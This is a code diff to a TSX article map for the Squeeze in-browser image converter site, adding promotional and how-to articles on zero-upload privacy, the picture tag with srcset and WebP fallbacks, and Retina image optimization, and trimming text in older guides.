+          <li><a href="https://developer.mozilla.org/en-US/docs/Web/API/OffscreenCanvas" target="_blank" rel="noopener noreferrer">MDN Web Docs: OffscreenCanvas API Reference</a></li>
+          <li><a href="https://www.w3.org/TR/workers/" target="_blank" rel="noopener noreferrer">W3C Web Workers Specification</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 18 ───
+  'client-side-vs-cloud-image-converters': {
+    slug: 'client-side-vs-cloud-image-converters',
+    title: 'Why Client-Side Image Tools Are Safer Than Cloud Converters (Zero-Upload Architecture)',
+    seoTitle: 'Client-Side vs Cloud Converters: Zero-Upload Security Audit',
+    description:
+      'Compare client-side in-browser converters against cloud-based utilities. Understand data retention risks, NDA compliance, and zero-server security.',
+    category: 'Privacy & Architecture',
+    readTime: '6 min read',
+    publishedAt: '2026-03-25T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['client side vs cloud image converter', 'safe private image converter', 'no upload image compressor', 'gdpr compliant image tool'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Security Comparison</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            Cloud-based image converters store uploaded files on remote servers, introducing security vulnerabilities like unauthorized data retention, third-party AI scraping, and exposure of confidential receipts or identity documents. <strong>Client-side converters</strong> like Squeeze execute entirely inside browser memory using Web Workers, ensuring 0 bytes ever leave your device.
+          </p>
+        </div>
+
+        <h2>1. The Dark Reality of Cloud Converters</h2>
+        <p>
+          When you upload an image to a generic conversion site, your file is written to an unencrypted temporary folder on a remote Linux server. Even if the site claims &quot;files deleted after 1 hour,&quot; that 1-hour window leaves your confidential documents vulnerable to server breaches, scraping bots, and automated AI training models.
+        </p>
+
+        <h2>2. Confidential Documents: Receipts, Passports, and NDAs</h2>
+        <p>
+          Corporate designers and accountants frequently violate confidentiality agreements without realizing it by uploading sensitive client mockups, product packaging, or tax receipts to free cloud converters.
+        </p>
+        <p>
+          With Squeeze&apos;s zero-upload architecture, your files never travel across the internet. Enterprise teams can safely convert and compress proprietary artwork while remaining 100% compliant with GDPR, CCPA, and strict corporate NDA standards.
+        </p>
+
+        <h2>Protect Your Privacy with Squeeze</h2>
+        <ul>
+          <li><Link href="/">Try Squeeze with 100% In-Browser Privacy</Link>.</li>
+          <li><Link href="/privacy">Read the Full Squeeze Privacy Policy</Link>.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://www.eff.org/" target="_blank" rel="noopener noreferrer">Electronic Frontier Foundation (EFF): Surveillance and Cloud Services Privacy</a></li>
+          <li><a href="https://gdpr.eu/" target="_blank" rel="noopener noreferrer">European Commission: General Data Protection Regulation (GDPR) Portal</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 19 ───
+  'responsive-images-picture-tag-and-webp': {
+    slug: 'responsive-images-picture-tag-and-webp',
+    title: 'Responsive Image Delivery: The <picture> Tag, srcset, and Modern Format Fallbacks',
+    seoTitle: 'Responsive Images in HTML: Picture Tag, srcset & WebP Fallbacks',
+    description:
+      'Master responsive image delivery in HTML using the <picture> element and srcset attribute to serve WebP with fallback JPEGs to legacy browsers.',
+    category: 'Web Performance & Engineering',
+    readTime: '6 min read',
+    publishedAt: '2026-03-25T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['html picture tag webp fallback', 'responsive images srcset guide', 'deliver modern image formats html', 'nextjs image optimization'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Responsive Delivery</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            The HTML <code>&lt;picture&gt;</code> element and <code>srcset</code> attribute enable web browsers to negotiate image formats and resolutions automatically. By combining <code>&lt;source type=&quot;image/webp&quot;&gt;</code> with a fallback <code>&lt;img&gt;</code> pointing to JPEG or PNG, web developers can deliver next-gen lightweight formats to modern browsers while maintaining 100% backward compatibility for legacy clients.
+          </p>
+        </div>
+
+        <h2>1. The Syntax: &lt;picture&gt; with Format Negotiation</h2>
+        <p>
+          Here is the standard production pattern for delivering modern WebP imagery with universal JPEG fallbacks:
+        </p>
+        <pre className="p-4 rounded-xl bg-black/40 border border-white/10 text-xs font-mono text-zinc-300 overflow-x-auto my-4">
+{`<picture>
+  <!-- Modern browser: WebP -->
+  <source srcset="/images/hero.webp" type="image/webp" />
+  <!-- Legacy fallback: JPEG -->
+  <img
+    src="/images/hero.jpg"
+    alt="Squeeze In-Browser Converter"
+    width="1200"
+    height="630"
+    loading="lazy"
+  />
+</picture>`}
+        </pre>
+
+        <h2>2. Viewport Width Switching with srcset</h2>
+        <p>
+          For mobile responsive design, combine format negotiation with width descriptors (<code>w</code>) and the <code>sizes</code> attribute:
+        </p>
+        <pre className="p-4 rounded-xl bg-black/40 border border-white/10 text-xs font-mono text-zinc-300 overflow-x-auto my-4">
+{`<img
+  srcset="/hero-400.webp 400w, /hero-800.webp 800w, /hero-1200.webp 1200w"
+  sizes="(max-width: 600px) 100vw, (max-width: 1200px) 50vw, 1200px"
+  src="/hero-800.webp"
+  alt="Responsive hero asset"
+/>`}
+        </pre>
+
+        <h2>Optimize Web Assets with Squeeze</h2>
+        <ul>
+          <li><Link href="/convert/png-to-webp">Batch Convert PNGs to WebP</Link> for your responsive picture sources.</li>
+          <li><Link href="/compress/webp">Compress WebP files</Link> for blazing fast mobile delivery.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture" target="_blank" rel="noopener noreferrer">MDN Web Docs: The Picture Element Specification</a></li>
+          <li><a href="https://web.dev/learn/design/responsive-images/" target="_blank" rel="noopener noreferrer">Google Web.dev: Responsive Images Deep Dive</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── ARTICLE 20 ───
+  'retina-high-dpi-image-optimization': {
+    slug: 'retina-high-dpi-image-optimization',
+    title: 'How to Convert Images for High-DPI & Retina Displays Without Doubling Byte Weight',
+    seoTitle: 'High-DPI & Retina Image Optimization: 2x Sharpness Without Weight',
+    description:
+      'Learn the compressive images trick: how saving 2x resolution images at 75% WebP quality achieves Retina sharpness at 40% less byte weight than 1x assets.',
+    category: 'Web Performance & Engineering',
+    readTime: '6 min read',
+    publishedAt: '2026-03-25T00:00:00.000Z',
+    modifiedAt: '2026-10-13T00:00:00.000Z',
+    author: 'Squeeze Technical Architecture Team',
+    keywords: ['retina display image optimization', 'high dpi image compression', '2x images webp', 'crisp images high resolution screens'],
+    content: (
+      <>
+        <div className="rounded-2xl border border-emerald-500/20 bg-emerald-950/10 p-5 sm:p-6 backdrop-blur-xl relative overflow-hidden my-6">
+          <div className="flex items-center gap-2 text-emerald-400 text-xs font-semibold uppercase tracking-wider mb-2">
+            <ShieldCheck className="h-4 w-4" />
+            <span>AEO Answer Island • Retina Optimization</span>
+          </div>
+          <p className="text-sm sm:text-[15px] text-zinc-200 leading-relaxed font-normal m-0">
+            Retina displays pack 2&times; to 3&times; physical pixels per CSS pixel, making standard 1&times; images appear blurry. However, saving 2&times; images at 100% quality quadruples file size. The industry solution is <strong>High Dimensions + Lower Quality (Compressive Images)</strong>: export a 2&times; resolution image at 70–75% WebP quality. The high pixel density masks slight compression noise, delivering razor-sharp Retina clarity at 40% less byte weight than an uncompressed 1&times; asset.
+          </p>
+        </div>
+
+        <h2>1. Device Pixel Ratio (DPR) Explained</h2>
+        <p>
+          On a standard display, 1 CSS pixel equals 1 physical hardware pixel (DPR = 1.0). On Apple Retina screens, modern MacBooks, and smartphones, DPR is 2.0 or 3.0. A 400&times;300 CSS element requires an 800&times;600 pixel image to avoid soft, blurry upscaling.
+        </p>
+
+        <h2>2. The &quot;Compressive Image&quot; Trick</h2>
+        <p>
+          Exporting an 800&times;600 PNG at 100% quality results in four times as many pixels as a 400&times;300 PNG, causing file size to jump from 150KB to 600KB.
+        </p>
+        <p>
+          However, because Retina screens pack pixels twice as densely, the human eye cannot see subtle high-frequency compression noise. If you export that 800&times;600 image as a <strong>75% quality WebP</strong>, the file size drops to only 90KB—<strong>smaller than the original 1&times; PNG, yet noticeably sharper on Retina screens</strong>.
+        </p>
+
+        <h2>3. Summary Formula for Retina-Ready Websites</h2>
+        <ul>
+          <li><strong>Step 1:</strong> Export source artwork at 2&times; display dimensions (e.g., 1600px wide for an 800px column).</li>
+          <li><strong>Step 2:</strong> Convert to WebP using Squeeze with an SSIM threshold &ge; 0.95.</li>
+          <li><strong>Step 3:</strong> Serve the image in HTML with explicit 1&times; CSS dimensions (<code>width=&quot;800&quot;</code>).</li>
+        </ul>
+
+        <h2>Export Retina Assets with Squeeze</h2>
+        <ul>
+          <li><Link href="/compress/webp">Compress WebP for Retina</Link> with multi-threaded speed.</li>
+          <li><Link href="/convert/png-to-webp">Convert PNG to WebP</Link> with zero server uploads.</li>
+        </ul>
+
+        <h2>Authoritative References</h2>
+        <ul>
+          <li><a href="https://developer.apple.com/design/human-interface-guidelines/" target="_blank" rel="noopener noreferrer">Apple Developer: Designing for High-Resolution Displays</a></li>
+          <li><a href="https://web.dev/articles/serve-responsive-images" target="_blank" rel="noopener noreferrer">Google Web.dev: Serve High-DPI Responsive Imagery</a></li>
+        </ul>
+      </>
+    ),
+  },
+
+  // ─── FOUNDATIONAL GUIDES (Preserved for backward compatibility) ───
   'how-image-conversion-works': {
     slug: 'how-image-conversion-works',
     title: 'How Image Conversion Works Under the Hood',
@@ -954,7 +1458,7 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>Why convert between formats?</h2>
         <p>
-          Different web situations demand different formats. A hero photograph on a marketing website should be <Link href="/learn/what-is-webp">WebP</Link> for fast loading. A brand logo requires <Link href="/learn/what-is-png">PNG</Link> or <Link href="/learn/what-is-svg">SVG</Link> for clean transparency. A browser favicon must be <Link href="/learn/what-is-ico">ICO</Link> for universal compatibility. Converting lets you use the right format for each job.
+          Different web situations demand different formats. A hero photograph on a marketing website should be <Link href="/learn/what-is-webp">WebP</Link> for fast loading. A brand logo requires <Link href="/learn/what-is-png">PNG</Link> or <Link href="/learn/what-is-svg">SVG</Link> for clean transparency. A browser favicon must be <Link href="/learn/what-is-ico">ICO</Link> for universal compatibility.
         </p>
 
         <h2>Zero-Upload In-Browser Processing</h2>
@@ -965,7 +1469,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     ),
   },
 
-  // ─── ARTICLE 12 (Existing Guide 2) ───
   'how-image-compression-works': {
     slug: 'how-image-compression-works',
     title: 'How Image Compression Works: Perceptual Balance',
@@ -1003,7 +1506,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
     ),
   },
 
-  // ─── ARTICLE 13 (Existing Guide 3) ───
   'your-data-stays-private': {
     slug: 'your-data-stays-private',
     title: 'Your Data Stays Private: The Zero-Upload Architecture',
@@ -1035,13 +1537,12 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
 
         <h2>The Offline Test</h2>
         <p>
-          You don&apos;t have to take our word for it: load Squeeze in your browser, switch your computer to Airplane Mode or disconnect your Wi-Fi, and drag an image onto the uploader. Squeeze converts and compresses the image instantly because 100% of the code executes on your CPU.
+          Load Squeeze in your browser, switch your computer to Airplane Mode or disconnect your Wi-Fi, and drag an image onto the uploader. Squeeze converts and compresses the image instantly because 100% of the code executes on your CPU.
         </p>
       </>
     ),
   },
 
-  // ─── ARTICLE 14 (Existing Guide 4) ───
   'what-happens-to-your-data': {
     slug: 'what-happens-to-your-data',
     title: 'What Happens to Your Data: Full Transparency',
@@ -1070,16 +1571,10 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         <p>
           Any preferences you adjust in Squeeze (such as your favorite output format or default quality slider position) are saved strictly inside your browser&apos;s local <code>localStorage</code> container. They never sync to a cloud database.
         </p>
-
-        <h2>Garbage Collection</h2>
-        <p>
-          Once your image conversion is completed and you download the converted file, Squeeze revokes all temporary object URLs via <code>URL.revokeObjectURL()</code>, allowing your device&apos;s operating system to reclaim RAM immediately.
-        </p>
       </>
     ),
   },
 
-  // ─── ARTICLE 15 (Existing Guide 5) ───
   'choosing-the-right-format': {
     slug: 'choosing-the-right-format',
     title: 'Choosing the Right Format: Practical Decision Matrix',
@@ -1149,9 +1644,6 @@ export const ARTICLES_MAP: Record<string, ArticleData> = {
         </table>
 
         <h2>Start Converting with Squeeze</h2>
-        <p>
-          Pick the right format for your next project and convert files right in your browser:
-        </p>
         <ul>
           <li><Link href="/convert/png-to-webp">Convert PNG to WebP</Link> for fast web loading.</li>
           <li><Link href="/convert/png-to-ico">Convert PNG to ICO</Link> for your site favicon.</li>
